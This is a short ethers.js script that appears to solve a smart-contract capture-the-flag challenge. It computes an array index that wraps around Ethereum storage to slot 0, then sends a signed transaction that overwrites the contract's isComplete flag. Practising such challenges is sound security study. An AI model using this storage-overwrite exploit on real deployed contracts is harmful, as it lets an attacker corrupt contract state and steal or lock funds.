
const { utils, BigNumber, Contract, ethers } = require('ethers');

var { wallet, provider } = require('./common')

const contractAddress = '0x48571eb5aa561853af0fd7f7f1747f46f4ffad80';

async function main() {
	const iface = new utils.Interface([
		'function set(uint256 key, uint256 value)',
		'function get(uint256 key) view returns (uint256)',
		'function isComplete() view returns (bool)'
	]);

	const mapDataBegin = BigNumber.from(
		utils.keccak256(
			'0x' + '1'.toString().padStart(64, '0')
		)
	)

	var contract = new Contract(contractAddress, iface, provider);
	var contractWithSigner = contract.connect(wallet);

	// slot 0: isComplete
	// slot 1: map.length  => 2^256 - 2 + 1 = 2^256 - 1 = max u256
	// ... map start
	// slot keccak(1) + 0: map[0]
	// slot keccak(1) + 1: map[1]
	// slot keccak(1) + 2: map[2]
	// slot keccak(1) + 3: map[3]
	// slot keccak(1) + 4: map[4]
	// ... map end

	// need to find index at this location now that maps to 0 mod 2^256
	// i.e., 0 - keccak(1) mod 2^256 <=> 2^256 - keccak(1) as keccak(1) is in range
	const isCompleteOffset = BigNumber.from(2).pow(256).sub(mapDataBegin);
	console.log("isCompleteOffset: ", isCompleteOffset.toHexString());

	var tx = await contractWithSigner.set(isCompleteOffset, 1);
	var result = await tx.wait();
	console.log('result : ', result);
}

main().catch(console.error);